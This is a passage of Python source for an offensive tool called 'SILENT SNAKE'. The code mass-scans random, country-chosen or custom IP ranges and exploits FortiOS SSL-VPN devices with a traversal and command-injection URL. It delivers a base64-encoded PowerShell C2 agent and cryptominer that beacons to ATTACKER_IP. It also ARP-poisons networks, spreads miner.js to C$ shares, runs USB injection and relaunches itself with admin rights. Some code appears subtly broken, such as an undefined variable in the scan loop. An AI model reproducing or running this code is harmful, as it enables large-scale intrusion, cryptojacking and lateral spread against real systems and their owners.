        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_POOL_URL_PLACEHOLDER", CONFIG["MINER_POOL_URL"])
        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_WALLET_ADDRESS_PLACEHOLDER", CONFIG["MINER_WALLET_ADDRESS"])

        dynamic_ps_script = dynamic_ps_script_base.replace("_AGENT_ID_PLACEHOLDER_", agent_id)
        dynamic_ps_script = dynamic_ps_script.replace("_AES_KEY_PLACEHOLDER_", aes_key_b64)
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
        dynamic_ps_script = dynamic_ps_script.replace("DNS_BEACON_DOMAIN", "example.com") 
        dynamic_ps_script = dynamic_ps_script.replace("BASE_BEACON_INTERVAL", "300")
        dynamic_ps_script = dynamic_ps_script.replace("BEACON_JITTER_PERCENT", "0.2")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_HTTP_BEACON_INTERVAL", "900")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_DNS_BEACON_INTERVAL", "3600")
        dynamic_ps_script = dynamic_ps_script.replace("CURRENT_MINER_PROCESS_NAME", "node.exe") 
        dynamic_ps_script = dynamic_ps_script.replace("RANDOM_XOR_KEY_PLACEHOLDER", ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))) 
        dynamic_ps_script = dynamic_ps_script.replace("C2_REGISTER_PATH", f"/api/v2/auth/login/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TASK_PATH", f"/api/v3/updates/check/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_RESULTS_PATH", f"/api/v4/data/submit/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TELEMETRY_PATH", f"/api/v1/metrics/upload/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_MINER_JS_PATH", "/cdn/assets/app.js") 

        encoded_ps_script = base64.b64encode(dynamic_ps_script.encode('utf-8')).decode('utf-8')
        ps_cmd_oneliner = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""
            
        protocol = "https" 
        
        payload = b"A" * 3000 
        target_url = f"{protocol}://{host}:{port}/remote/hostcheck_validate"
        headers = get_random_headers()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        try:
            async with session.post(target_url, data=payload, headers=headers, timeout=5, ssl=False) as response:
                pass
        except (aiohttp.ClientError, asyncio.TimeoutError):
            console.print(f"[green]FortiOS confirmation payload sent to {host}:{port}.[/green]")
            encoded_cmd = urllib.parse.quote(ps_cmd_oneliner) 
            rce_path = f"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession;{encoded_cmd}"
            try:
                async with session.get(f"{protocol}://{host}:{port}{rce_path}", timeout=5, ssl=False):
                    pass
            except (aiohttp.ClientError, asyncio.TimeoutError):
                 console.print(f"[green]FortiOS secondary payload sent to {host}:{port}.[/green]")
            return True
        except Exception as e:
            console.print(f"[red]FortiOS RCE failed on {host}:{port}: {e}[/red]")
            return False
        return False

    async def run_scan_and_exploit(self, start_ip_str, end_ip_str, session):
        """Initiates the scanning and exploitation process for a given IP range."""
        try:
            self.check_ipp_server() 
            self.check_http_server() 
            
            if not self.ipp_server_running and HAS_SCAPY: 
                console.print(f"[red][{time.strftime('%H:%M:%S')}] IPP server is dormant on port {CONFIG['IPP_PORT']}. IPP-related exploits might fail.[/red]")
            if not self.http_server_running:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] Local HTTP server is dormant on port {CONFIG['HTTP_PORT']}. Browser-based mining/payload hosting might fail.[/red]") 
            
            total_ips_in_range = int(ipaddress.IPv4Address(end_ip_str)) - int(ipaddress.IPv4Address(start_ip_str)) + 1
            total_scan_tasks = total_ips_in_range * len(CONFIG["TARGET_PORTS"]) 
            
            progress_columns = [
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed} of {task.total})"),
                TimeRemainingColumn(),
            ]
            with Progress(*progress_columns, console=console) as progress: # 'progress' object created here
                main_task = progress.add_task(f"Scanning Range {start_ip_str} - {end_ip_str}", total=total_scan_tasks, completed=self.scanned_count)

                # Check for resume point and adjust current_ip_obj and scanned_count
                checkpoint = load_checkpoint()
                current_ip_obj = ipaddress.IPv4Address(start_ip_str)
                if checkpoint and checkpoint.get("scan_mode") == "range" and \
                   checkpoint.get("start_ip") == start_ip_str and \
                   checkpoint.get("end_ip") == end_ip_str:
                    
                    self.scanned_count = checkpoint.get("scanned_count", 0)
                    if len(CONFIG["TARGET_PORTS"]) > 0:
                        current_ip_offset = self.scanned_count // len(CONFIG["TARGET_PORTS"])
                        current_ip_obj = ipaddress.IPv4Address(start_ip_str) + current_ip_offset
                        if current_ip_obj > ipaddress.IPv4Address(end_ip_str): 
                            current_ip_obj = ipaddress.IPv4Address(start_ip_str)
                            self.scanned_count = 0
                        progress.update(main_task, completed=self.scanned_count, total=total_scan_tasks)
                        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Resuming scan from {current_ip_obj} (approx). Already processed {self.scanned_count}/{total_scan_tasks} IP:Port attempts.[/yellow]")
                    else:
                        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Checkpoint exists but no target ports defined or invalid for resume. Starting new scan.[/yellow]")
                        self.scanned_count = 0
                        progress.update(main_task, total=total_scan_tasks)
                else:
                    self.scanned_count = 0
                    progress.update(main_task, total=total_scan_tasks)
                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Starting new scan for range {start_ip_str}-{end_ip_str}. Total expected IP:Port checks: {total_scan_tasks}[/yellow]")
                
                # Main scanning loop for IPs
                batch_ips_to_process = []
                # Iterate through the range, collecting IPs for a batch
                while current_ip_obj <= ipaddress.IPv4Address(end_ip_obj):
                    batch_ips_to_process.append(str(current_ip_obj))
                    current_ip_obj += 1

                    # When a batch is full or we've reached the end of the range
                    if len(batch_ips_to_process) >= CONFIG["BATCH_SIZE"] or current_ip_obj > ipaddress.IPv4Address(end_ip_obj):
                        batch_tasks = []
                        for ip_to_scan in batch_ips_to_process:
                            # For each IP, create a task for each target port
                            for port in CONFIG["TARGET_PORTS"]:
                                batch_tasks.append(
                                    self._process_single_ip_scan_exploit(
                                        asyncio.Semaphore(CONFIG["CONCURRENT_CONNECTIONS"]), 
                                        ip_to_scan, port, CONFIG["WEB_SCAN_TIMEOUT"], session, 
                                        progress, main_task, 
                                        total_scan_tasks, "range", start_ip_str, end_ip_str
                                    )
                                )
                        await asyncio.gather(*batch_tasks) # Run all IP:Port tasks for the current batch concurrently
                        batch_ips_to_process = [] # Reset for next batch
                
                console.print(f"[green][{time.strftime('%H:%M:%S')}] --- Custom Range Scan Complete ---[/green]")

        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error in run_scan_and_exploit: {e}[/red]")
            log_crash(e, traceback.format_exc())

    async def exploit_established_connections(self):
        console.print(f"[grey][{time.strftime('%H:%M:%S')}] Unleashing shadow strikes on known vulnerabilities...[/grey]")
        try:
            vulnerable_ips = set()
            if os.path.exists(IP_LOG_FILE):
                with open(IP_LOG_FILE, 'r', encoding='utf-8') as f:
                    for line in f:
                        ip_port = line.strip()
                        if ':' in ip_port and is_valid_ip(ip_port.split(':')[0]):
                            vulnerable_ips.add(ip_port)
                console.print(f"[grey][{time.strftime('%H:%M:%S')}] Summoned {len(vulnerable_ips)} vulnerable IPs from {IP_LOG_FILE}[/grey]")
            else:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] No vulnerable IPs found in {IP_LOG_FILE}[/yellow]")
                return
            if not vulnerable_ips:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] No valid targets to strike.[/yellow]")
                return
            
            self.check_ipp_server()
            self.check_http_server()
            if not self.ipp_server_running and HAS_SCAPY:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Cannot strike: IPP server dormant on port {CONFIG['IPP_PORT']}.[/red]")
                return
            if not self.http_server_running:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Cannot strike: Local HTTP server dormant on port {CONFIG['HTTP_PORT']}.[/red]")
                return

            connector = aiohttp.TCPConnector(limit=CONFIG["CONCURRENT_CONNECTIONS"], limit_per_host=10, force_close=True, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = []
                for ip_port in vulnerable_ips:
                    task = asyncio.create_task(self.exploit_ip(ip_port, session)) 
                    tasks.append(task)
                await asyncio.gather(*tasks)
                console.print(f"[grey][{time.strftime('%H:%M:%S')}] Shadow strikes completed.[/grey]")
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Error in shadow strikes: {e}[/red]")
            log_crash(e, traceback.format_exc())

    async def exploit_ip(self, ip_port, session):
        """Attempts to exploit a single IP:port target from the vulnerable_ips list."""
        try:
            ip, port_str = ip_port.split(':')
            port = int(port_str)
            # Log the exploitation attempt for consistency
            console.print(f"[cyan][{time.strftime('%H:%M:%S')}] Attempting to strike {ip}:{port}[/cyan]")
            
            # Generate agent_id and register agent here for specific IP
            agent_id = f"manual-{str(uuid.uuid4())[:8]}" # Unique agent ID for this exploit attempt
            aes_key_b64 = await register_agent_with_c2(agent_id, ip, session)

            success = False
            if aes_key_b64:
                # Pass agent_id and aes_key_b64 to dispatch_exploits
                success = await self.dispatch_exploits(ip, session, port, agent_id, aes_key_b64)
            else:
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Agent registration failed for {ip}:{port}. Skipping exploitation attempts for this target.[/yellow]")

            async with self.locker:
                if success:
                    console.print(f"[bold green][{time.strftime('%H:%M:%S')}] [SUCCESS] Exploited Target: {ip}:{port} (Venom agent delivered)[/bold green]")
                    with open(EXPLOITED_FILE, 'a', encoding='utf-8') as exp_file:
                        exp_file.write(f"{ip}:{port}\n")
                    
                    # --- New Feature: Optimize Network Propagation with ARP Poisoning --- 
                    gateway_ip = get_default_gateway_ip()
                    if gateway_ip:
                        console.print(f"[green][{time.strftime('%H:%M:%S')}] Starting ARP poisoning on {ip} through gateway {gateway_ip}[/green]")
                        start_arp_poisoning(gateway_ip, ip)
                    else:
                        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Could not get gateway IP for ARP poisoning on {ip}. Skipping.[/yellow]")

                    # Trigger network share propagation via C2 task 
                    propagate_task_command = f"propagate_share|miner.js|\\\\{ip}\\C$" # Example: copy miner.js to C$ share
                    
                    try:
                        async with session.post(
                            f"https://{CONFIG['ATTACKER_IP']}:{CONFIG['ATTACKER_PORT']}/api/v4/data/submit/{agent_id}",
                            data=propagate_task_command.encode('utf-8'), # Send as bytes
                            headers={'Content-Type': 'text/plain'},
                            timeout=CONFIG["WEB_SCAN_TIMEOUT"],
                            ssl=False
                        ) as response:
                            if response.status == 200:
                                console.print(f"[green][{time.strftime('%H:%M:%S')}] Sent network propagation task for {ip} to C2 via agent {agent_id}.[/green]")
                            else:
                                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Failed to send propagation task for {ip} to C2. Status: {response.status}[/yellow]")
                    except aiohttp.ClientError as e:
                        console.print(f"[red][{time.strftime('%H:%M:%S')}] Network error sending propagation task for {ip}: {e}[/red]")
                    except Exception as e:
                        console.print(f"[red][{time.strftime('%H:%M:%S')}] Unexpected error sending propagation task for {ip}: {e}[/red]")
                    # --- End of New Feature: Optimize Network Propagation ---
                    
                else:
                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Strike failed for {ip}:{port}[/yellow]")
        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Strike error for {ip_port}: {e}[/red]")
            log_crash(e, traceback.format_exc())
            return

    def generate_random_ip_from_ranges(self, ip_ranges):
        try:
            start_str, end_str = random.choice(ip_ranges)
            start_ip = int(ipaddress.IPv4Address(start_str))
            end_ip = int(ipaddress.IPv4Address(end_str))
            random_int = random.randint(start_ip, end_ip)
            return str(ipaddress.IPv4Address(random_int))
        except (ValueError, IndexError) as e:
            console.print(f"[red]Error generating IP from ranges: {e}[/red]")
            log_crash(e, traceback.format_exc())
            return self._generate_random_public_ip_fallback()

    def _generate_random_public_ip_fallback(self):
        while True:
            ip_int = random.randint(1, 2**32 - 2) 
            ip_obj = ipaddress.IPv4Address(ip_int)
            if ip_obj.is_global and not any(ip_obj in res_range for res_range in RESERVED_RANGES):
                return str(ip_obj)

    async def scan_ips(self, ip_generator_func, total_size, concurrency, timeout, description, session): # Pass session here
        
            checkpoint = load_checkpoint()
            self.scanned_count = 0
            # Total scan tasks is now (Total generated IPs) * (Number of target ports)
            total_scan_tasks = total_size * len(CONFIG["TARGET_PORTS"])
            
            if checkpoint and checkpoint.get("scan_mode") == description.split(":")[0].strip() and checkpoint.get("total_ips") == total_size:
                self.scanned_count = checkpoint.get("scanned_count", 0)
                console.print(f"[yellow]Resuming '{description}' scan from {self.scanned_count}/{total_scan_tasks} IP:Port checks.[/yellow]")
            else:
                console.print(f"[yellow]Starting new '{description}' scan. Total expected IP:Port checks: {total_scan_tasks}[/yellow]")
                
            progress_columns = [
                TextColumn("[bold cyan]{task.description}"), BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed} of {task.total})"), TimeRemainingColumn(),
            ]
            with Progress(*progress_columns, console=console) as progress: 
                main_task = progress.add_task(description, total=total_scan_tasks, completed=self.scanned_count)
                
                ips_generated_count = 0
                while self.running and ips_generated_count < total_size:
                    # Generate a batch of IPs
                    current_ip_batch = []
                    for _ in range(CONFIG["BATCH_SIZE"]):
                        if ips_generated_count < total_size:
                            current_ip_batch.append(ip_generator_func())
                            ips_generated_count += 1
                        else:
                            break

                    if not current_ip_batch:
                        break

                    semaphore = asyncio.Semaphore(concurrency)
                    tasks = []
                    for ip in current_ip_batch:
                        for port in CONFIG["TARGET_PORTS"]:
                            tasks.append(
                                self._process_single_ip_scan_exploit(
                                    semaphore, ip, port, timeout, session, progress, main_task, 
                                    total_scan_tasks, description.split(":")[0].strip(), "", ""
                                )
                            )
                    
                    await asyncio.gather(*tasks) # Wait for all IP:Port tasks in the current batch to complete


    async def scan_selected_country(self, country_name, session): # Pass session here
        if not country_name:
            console.print("[yellow]No country selected for the scan.[/yellow]")
            return
            
        console.print(f"[bold magenta]Initiating targeted scan for: {country_name}[/bold magenta]")
        
        selected_ranges = COUNTRY_IP_RANGES.get(country_name)

        if not selected_ranges:
            console.print(f"[red]Could not find IP ranges for {country_name}.[/red]")
            return

        ip_generator_func = lambda: self.generate_random_ip_from_ranges(selected_ranges)
        await self.scan_ips(ip_generator_func, CONFIG["SCAN_SIZE"], CONFIG["CONCURRENT_CONNECTIONS"], CONFIG["WEB_SCAN_TIMEOUT"], f"Targeted Scan: {country_name}", session) # Pass session here

def typewriter(text, delay=0.04, style="bold white"):
    for char in text:
        console.print(char, end='', style=style, soft_wrap=True)
        time.sleep(delay)
    print()

def draw_silent_snake_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = figlet_format("SILENT SNAKE", font="ghost")
    console.print(banner, style="bold orange_red1")
    console.print(Text("Welcome to the Shadowed Cyber Crypt", style="bold medium_purple4"))

def show_menu():
    options = [
        ("Targeted Scan (Select Country)", 'targeted'),
        ("Random Scan (Vast Network Sweep)", 'random'),
        ("Custom Range Scan", 'custom_range'), 
        ("Spectral Recon (Browser Mining)", 'spectral'), 
        ("Cryptic Possession (Update Config)", 'config'),
        ("Shadow Strike (Exploit Known IPs)", 'strike'),
        ("Purge Phantoms (Kick Listeners)", 'purge'),
        ("Vanish into Shadows", 'exit')
    ]
    console.print("\n--- [bold bright_magenta]Choose Your Dark Path[/bold bright_magenta] ---")
    for i, (text, _) in enumerate(options):
        console.print(f"[cyan]{i+1}[/cyan]. {text}")
    
    while True:
        try:
            choice = int(input("> ")) - 1
            if 0 <= choice < len(options):
                return options[choice][1]
            else:
                console.print("[red]Invalid choice. Please try again.[/red]")
        except ValueError:
            console.print("[red]Please enter a number.[/red]")

def prompt_for_country():
    country_list = sorted(COUNTRY_IP_RANGES.keys())
    console.print("\n--- [bold magenta]Available Countries for Targeted Scan[/bold magenta] ---")
    num_countries = len(country_list)
    num_columns = 3
    column_length = (num_countries + num_columns - 1) // num_columns
    for i in range(column_length):
        line = ""
        for col in range(num_columns):
            index = i + col * column_length
            if index < num_countries:
                line += f"{index+1: >4}. {country_list[index]:<30}"
        console.print(line)

    console.print("\n[bold yellow]Enter the number of the country to scan.[/bold yellow]")
    console.print("[bold yellow]Press ENTER with no input to go back.[/bold yellow]")

    while True:
        try:
            raw_input = input("> ")
            if not raw_input.strip():
                return None
            
            selected_index = int(raw_input.strip()) - 1
            
            if 0 <= selected_index < len(country_list):
                return country_list[selected_index]
            else:
                console.print(f"[bold red]Error: Index {selected_index + 1} is out of range. Please try again.[/bold red]")

        except ValueError:
            console.print("[bold red]Invalid input. Please enter a single number.[/bold red]")

class MinerHTTPRequestHandler(http.server.SimpleHTTPRequestHandler): 
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path == '/miner.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            miner_html = EMBEDDED_MINER_JS 
            self.wfile.write(miner_html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def start_http_server():
    try:
        httpd = socketserver.TCPServer(("", CONFIG["HTTP_PORT"]), MinerHTTPRequestHandler)
        console.print(f"[grey][{time.strftime('%H:%M:%S')}] Miner Hosting server awakened on port {CONFIG['HTTP_PORT']}[/grey]")
        httpd.serve_forever()
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Miner Hosting server error: {str(e)}[/red]")
        log_crash(e, traceback.format_exc())

async def haunted_terminal(scanner, session): # Pass session here
    while True:
        draw_silent_snake_banner()
        typewriter("\nðŸ’€ Slithering into the Digital Abyss...", style="bold medium_purple4")
        
        choice = await asyncio.to_thread(show_menu)
        console.clear()
        
        actions = {
            'targeted': "ðŸŽ¯ Preparing for a Targeted Strike...",
            'random': "ðŸŒ Unleashing the Serpent's Wrath Across the Net...",
            'custom_range': "ðŸ” Custom Range Scan Initiated...", 
            'spectral': "ðŸ‘ï¸ Conjuring Spectral Recon in the Local Realm...",
            'config': "ðŸ•¸ï¸ Weaving Cryptic Possession from Distant Shadows...",
            'strike': "âš¡ Striking Known Prey with Shadowed Fangs...",
            'purge': "ðŸª¦ Purging Phantom Listeners from Target Ports...",
            'exit': "ðŸŒ‘ Vanishing into the Shadows... until the next strike."
        }
        typewriter(actions.get(choice, "Invalid choice..."), style="bold orange_red1")
        time.sleep(1)

        if choice == 'targeted':
            selected_country = await asyncio.to_thread(prompt_for_country)
            if selected_country:
                await scanner.scan_selected_country(selected_country, session)
        elif choice == 'random':
            async def random_ip_generator_wrapper():
                return scanner._generate_random_public_ip_fallback()
            await scanner.scan_ips(random_ip_generator_wrapper, CONFIG["SCAN_SIZE"], CONFIG["CONCURRENT_CONNECTIONS"], CONFIG["WEB_SCAN_TIMEOUT"], "Random Scan", session)
        elif choice == 'custom_range':
            start_ip_str = None
            end_ip_str = None
            while True:
                user_input = console.input("[bold blue]Enter the IP range to scan (e.g., 192.168.1.1-192.168.1.255 or 1.52.0.0-1.55.255.255): [/bold blue]").strip()
                if '-' in user_input:
                    parts = user_input.split('-')
                    if len(parts) == 2:
                        temp_start_ip = parts[0].strip()
                        temp_end_ip = parts[1].strip()
                        if is_valid_ip(temp_start_ip) and is_valid_ip(temp_end_ip):
                            try:
                                if ipaddress.IPv4Address(temp_start_ip) <= ipaddress.IPv4Address(temp_end_ip):
                                    start_ip_str = temp_start_ip
                                    end_ip_str = temp_end_ip
                                    break 
                                else:
                                    console.print("[red]Start IP address cannot be greater than End IP address. Please try again.[/red]")
                            except ipaddress.AddressValueError:
                                console.print("[red]Invalid IP address format in the range. Please try again.[/red]")
                        else:
                            console.print("[red]Invalid IP address(es) in the range. Please try again.[/red]")
                    else:
                        console.print("[red]Invalid range format. Use start_ip-end_ip (e.g., 192.168.1.1-192.168.1.255).[/red]")
                else:
                    console.print("[red]Invalid input. Please enter an IP range in the format start_ip-end_ip.[/red]")
            # Call run_scan_and_exploit directly, it will handle its own progress and session
            await scanner.run_scan_and_exploit(start_ip_str, end_ip_str, session)
        elif choice == 'spectral':
            in_memory_mining() 
        elif choice == 'config':
            # This section handles updating CONFIG["TARGET_PORTS"] based on user input
            ports_input = console.input("Enter ports to scan (comma-separated, e.g., 80,443,8080, or press enter for defaults): ").strip()
            if ports_input:
                try:
                    new_ports = [int(p.strip()) for p in ports_input.split(',') if p.strip().isdigit()]
                    if new_ports:
                        CONFIG["TARGET_PORTS"] = new_ports
                        console.print(f"[green]CONFIG['TARGET_PORTS'] updated to: {CONFIG['TARGET_PORTS']}[/green]")
                    else:
                        console.print("[yellow]No valid ports entered. Keeping current TARGET_PORTS.[/yellow]")
                except ValueError:
                    console.print("[red]Invalid port format. Ports must be numbers separated by commas.[/red]")
            else:
                console.print("[yellow]No ports entered. Keeping current TARGET_PORTS.[/yellow]")
            console.print("[yellow]Simulating other config update operations. The actual 'ConfLoad' module and its functionality for updating configuration are external to this script's provided content.[/yellow]")
        elif choice == 'strike':
            await scanner.exploit_established_connections()
        elif choice == 'purge':
            await scanner.kick_listeners()
        elif choice == 'exit':
            console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Slithering away...[/yellow]")
            scanner.running = False
            os._exit(0)
        
        console.print("\n[bold cyan]Press ENTER to return to the main menu...[/bold cyan]")
        await asyncio.to_thread(input)
        console.clear()

# Corrected: Removed async keyword. aiohttp.ClientSession is already an async context manager.
def create_session():
    # In a real application, you might configure specific headers, cookies, etc.
    connector = aiohttp.TCPConnector(limit=CONFIG["CONCURRENT_CONNECTIONS"], limit_per_host=10, force_close=True, ssl=False)
    return aiohttp.ClientSession(connector=connector)

async def main_async_entry(passphrase):
    usb_thread = threading.Thread(target=usb_inject, daemon=True)
    usb_thread.start()

    watchdog_thread = threading.Thread(target=watchdog, args=(passphrase,), daemon=True)
    watchdog_thread.start()

    http_server_thread = threading.Thread(target=start_http_server, daemon=True)
    http_server_thread.start()

    if HAS_IPP_SERVER: 
        ipp_server_thread = threading.Thread(target=start_ipp_server, daemon=True)
        ipp_server_thread.start()
    else:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] IPP server disabled due to missing 'ippserver' library.[/red]")

    time.sleep(2) 

    scanner = ScanningExploitationEngine() 
    # Initialize aiohttp.ClientSession once at the higher level
    connector = aiohttp.TCPConnector(limit=CONFIG["CONCURRENT_CONNECTIONS"], limit_per_host=10, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        scanner.session = session # Assign session to the scanner instance after creation
        await scanner.kick_listeners(ports=[CONFIG["HTTP_PORT"], CONFIG["IPP_PORT"]] + CONFIG["TARGET_PORTS"])
        
        loading_animation(duration=3, message="Initializing the Crypt")
        try:
            install_dependencies(passphrase) 
            await haunted_terminal(scanner, session) # Pass the session object here
        except (KeyboardInterrupt, asyncio.CancelledError):
            console.print(f"\n[{time.strftime('%H:%M:%S')}] Serpent interrupted by summoner. Vanishing.[/yellow]")
            scanner.running = False
            os._exit(0) 

def in_memory_mining():
    """
    Opens a web browser with an in-memory WASM miner.
    This simulates browser-based mining and relies on the local HTTP server.
    """
    try:
        miner_url = f"http://127.0.0.1:{CONFIG['HTTP_PORT']}/miner.html"
        console.print(f"[green][{time.strftime('%H:%M:%S')}] Launching in-memory WASM miner in browser: {miner_url}[/green]")
        webbrowser.open(miner_url)
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Failed to launch in-memory miner: {e}[/red]")
        log_crash(e, traceback.format_exc())

# Dummy function for get_random_headers. In a full script, this would be defined elsewhere.
def get_random_headers():
    ua = UserAgent()
    return {'User-Agent': ua.random}

if __name__ == "__main__":
    if platform.system() == 'Windows':
        try:
            import ctypes
            import pythoncom 
            if not ctypes.windll.shell32.IsUserAnAdmin():
                console.print("[yellow]Insufficient privileges. Re-launching with administrator rights...[/yellow]")
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except Exception as e:
            console.print(f"[red]Could not request admin privileges: {e}. Please run the script as an administrator.[/red]")
            sys.exit(1)
            
    try:
        passphrase = getpass.getpass("Enter passphrase for serpent's protection (will be hidden): ")

        install_dependencies(passphrase)

        asyncio.run(main_async_entry(passphrase))
    except KeyboardInterrupt:
        console.print(f"\n[{time.strftime('%H:%M:%S')}] Serpent interrupted by summoner. Vanishing.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red][{time.strftime('%H:%M:%S')}] Core error: {e}[/red]")
        log_crash(e, traceback.format_exc())
        os._exit(1)